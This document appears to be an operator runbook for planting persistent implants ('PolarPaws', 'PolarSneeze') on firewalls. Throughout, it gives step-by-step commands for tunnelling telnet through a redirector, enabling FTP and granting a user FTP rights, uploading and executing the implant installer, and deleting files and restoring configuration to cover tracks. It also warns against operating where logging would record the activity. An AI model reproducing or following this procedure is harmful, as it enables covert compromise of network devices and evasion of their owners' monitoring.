!!! WARNING: Firewall logs everything !!!

## Need to be Level 3 to perform OP
## Look in sampleman_commands.txt
## Enabling FTP server and user for TX, must use NOPEN redirection!
## Need to be Level 3 to perform install
## Look in sampleman_commands.txt
## To get system user level 3
## Use this script for TX & VT

super

## Config will have an easily crackable password

!!! If you see "info-center loghost X.X.X.X" during a sampleman, DO NOT IMPLANT !!! 
!!! Unless we own the syslog server !!!
!!! SNMP traps will also log our activity !!!
!!! SNMP traps going into system-view !!!

#### Everything you need for the op is in firewalls/TURBO directory ####
#
### Process of TURBO ###
0. Key a PolarPaws implant
1. Establish telnet session, sample_man
2. Verify/Enable ftp server and users FTP directory, Check for logging
3. Establish FTP session to Firewall to put up PolarPaws (PBD) and PolarSneeze(InstantGrat)
4. Establish telnet session, run batch scripts
5. Restore original configuration (if changed)
6. Establish LP comms with PandaRock
7. Key the loaded PolarSneeze implant using PandaRock

### Check updated_scripts for TURBO_build-new.txt to see how to key implant

# create an upload directory for nftp, put polarsneezy & polarpaws files into upload directory
mkdir /current/bin/FW/TURBO/upload
cd /current/bin/FW/TURBO/upload

cp /current/bin/FW/TURBO/rekey/bfile.* bfile
cp /current/bin/FW/TURBO/PP/TX/btest.bat .
cp /current/bin/FW/TURBO/PS/E1000_VRP330_R0350_03_08/s* .
chmod 777 *

#### How to telnet to the Firewall ####
#
# Must use NOPEN redirection, on redirector:
-tunnel
l 2300 TARGET_IP 23

# Run through below sample_man commands
# If there is no logging, or we own the trap server continue with FTP checks
# For FTP to work we need to see two things in the config: the server to be enabled, and a 
# User to be able to FTP

## check VTY line to confirm only user logged in

display users
display version

## if logging enabled ##

#### How to enable FTP ####


# Configuration/System changes must take place in the system-view context, prompt will change to [hostname]

#FTP server enable
#local-user <user_name> ftp-directory flash:/

system-view
display info-center
ftp server enable

#### How to enable FTP for a user ####
# Verify file directory mount point from dir ran in sampleman
# From the System-view context, go to the aaa context, prompt will change to [hostname-aaa]

aaa
local-user <USER> ftp-directory flash:/

# Also give user FTP privs
# Change <current privs> with the user current privs such as web telnet ssh

local-user <USER> service-type <current privs> ftp

#display AAA configuration information

display aaa configuration

#### How to FTP ####
#
# NOPEN comes with nftp, which can redirect the ftp session

# On redirector

-tunnel 12121 udp

# In a local scripted window do this:
# local directory will be from wherever the command is runcd into the down folder for the firewall

cd /current/bin/FW/TURBO/upload
nftp -h
nftp -r REDIRECTOR_IP -N 127.0.0.1 FIREWALL_IP

# Putting up PolarSneeze and PolarPaws for instant accesss
dir
put test.bat test.bat

# Pulling files
dir
bin
get <file>


# Now the instant grat (PolarSneeze) & PBD (PolarPaws) are uploaded
# DONE with ftp, end your session

quit


### !!!! If you enabled ftp, here is how to disable it again, get on with Telnet
# System view to disable the ftp server, aaa view to remove user ftp setting
# User local-user command to remove ftp privs if you had to enable them

display users all
display clock

undo ftp server
aaa
undo local-user <USER> ftp-directory
local-user <user> service-type <privs>
return

# Redisplay current config to make sure no permit changes
display current

#### Telnet to execute uploaded batch files ####
#
# Get back onto telnet session, super is required for execution 

system-view

### Both version execute polarsneeze the same way!
execute test.bat

# The install process takes a couple minutes andwill automatically switch from system-view to user view when the install process is done.

# delete sfile and test.bat

delete /unreserved sfile
delete /unreserved test.bat


# Box should be instant grat, a reboot will make the PolarPaws active; return to regular view
# Note: DO NOT run test.bat if the reboot has occured with PP already active, bad juju.


#### Connecting with pandarock to PolarSneeze ####
